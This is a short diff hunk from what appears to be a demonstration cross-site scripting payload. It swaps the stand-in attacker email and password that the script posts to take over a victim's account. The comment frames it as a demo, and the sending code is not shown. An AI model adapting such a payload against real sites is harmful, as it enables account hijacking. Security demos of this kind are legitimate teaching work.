@@ -11,8 +11,8 @@
 // reset to the attacker-controlled email. (Change these to your own demo values.)
 
 (function () {
-  var ATTACKER_EMAIL = "attacker@evil.example";
-  var ATTACKER_PASSWORD = "pwned-by-xss";
+  var ATTACKER_EMAIL = "pwned@attacker.example";
+  var ATTACKER_PASSWORD = "Pwned-By-XSS-2026!";
 
   var body = "email=" + encodeURIComponent(ATTACKER_EMAIL) +
              "&password=" + encodeURIComponent(ATTACKER_PASSWORD);
